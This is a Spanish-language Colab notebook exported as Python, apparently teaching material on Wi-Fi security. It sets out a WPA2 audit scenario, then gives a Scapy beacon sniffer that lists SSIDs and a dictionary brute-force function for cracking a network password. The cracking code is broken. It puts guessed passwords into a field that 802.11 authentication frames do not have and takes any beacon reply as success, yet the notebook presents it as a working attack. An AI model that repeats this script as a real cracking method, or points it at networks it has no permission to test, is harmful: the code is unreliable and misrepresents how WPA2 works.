# -*- coding: utf-8 -*-
"""Cracking y Sniffer.ipynb

Automatically generated by Colaboratory.

Original file is located at
    https://colab.research.google.com/drive/1yrgNpuHKXz5FHQ3ZMh1MJ6MYqOjG3ktS

# **Introucción:**

La seguridad en redes inalámbricas es un aspecto crítico en la actualidad, dado el creciente uso de tecnologías Wi-Fi en entornos domésticos y empresariales. Con la evolución constante de las amenazas cibernéticas, es crucial comprender los posibles ataques a redes inalámbricas para poder implementar medidas preventivas eficaces.

En este contexto, abordaremos dos aspectos clave: la autenticación y las técnicas de "Cracking", así como la utilización de "Sniffers" para encontrar SSID (Identificadores de Conjunto de Servicios).

# **Caso Práctico:**

Imaginemos una empresa que utiliza una red inalámbrica para proporcionar conectividad a sus empleados. Dicha red está protegida mediante un protocolo de seguridad, como WPA2, pero existe la necesidad de evaluar su resistencia a posibles ataques. En este escenario, un profesional de seguridad informática realiza una evaluación de seguridad para identificar posibles vulnerabilidades y mejorar la robustez de la red.

# **Ejemplos de Codificación en Python:**

**2.1.1. Autenticación y técnicas de "Cracking":**

En este caso, se explorará la vulnerabilidad de una red Wi-Fi mediante el uso de herramientas de "Cracking" que intentan descifrar contraseñas. A continuación, se muestra un ejemplo simple de cómo un atacante podría usar Python y la biblioteca "Scapy" para realizar un ataque de fuerza bruta contra una red Wi-Fi:
"""

from scapy.all import *

def crack_wifi_password(target_bssid, dictionary_file):
    # Cargar lista de contraseñas desde el archivo
    with open(dictionary_file, 'r') as file:
        passwords = file.readlines()

    # Crear paquete de autenticación
    auth_packet = Dot11(type=0, subtype=11, addr1="ff:ff:ff:ff:ff:ff", addr2=target_bssid, addr3=target_bssid) / Dot11Auth(algo=0, seqnum=1, status=0)

    # Iterar sobre contraseñas e intentar autenticarse
    for password in passwords:
        auth_packet[Dot11Auth].psk = password.strip()
        response = srp1(auth_packet, timeout=1, verbose=0)

        if response and response.haslayer(Dot11Beacon):
            print(f"Contraseña encontrada: {password.strip()}")
            break
    else:
        print("Contraseña no encontrada en la lista proporcionada.")

# PROGRAMA PRINCIPAL

crack_wifi_password("00:11:22:33:44:55", "lista_contraseñas.txt")

"""**2.1.2. Utilización de "Sniffers" para encontrar SSID:**

En este ejemplo, exploraremos el uso de "Sniffers" para descubrir información sobre las redes Wi-Fi cercanas, incluyendo sus SSID. Utilizaremos la biblioteca "Scapy" para capturar y analizar los paquetes de la red:
"""

from scapy.all import *

def sniff_wifi_ssid():
    # Función para manejar cada paquete recibido
    def packet_handler(packet):
        if packet.haslayer(Dot11Beacon):
            ssid = packet[Dot11Elt].info.decode('utf-8')
            print(f"SSID encontrado: {ssid}")

    # Configurar el filtro para capturar solo paquetes de gestión de Wi-Fi
    sniff(prn=packet_handler, store=0, iface="wlan0", filter="type mgt subtype beacon")

# Uso del método
sniff_wifi_ssid()

"""**Instalar WinPcap o Npcap**

Asegúrate de tener instalado uno de estos paquetes en tu sistema. Puedes descargar WinPcap desde winpcap.org o Npcap desde npcap.org. Después de la instalación, reinicia tu entorno de desarrollo (reinicia el script, terminal o IDE).
"""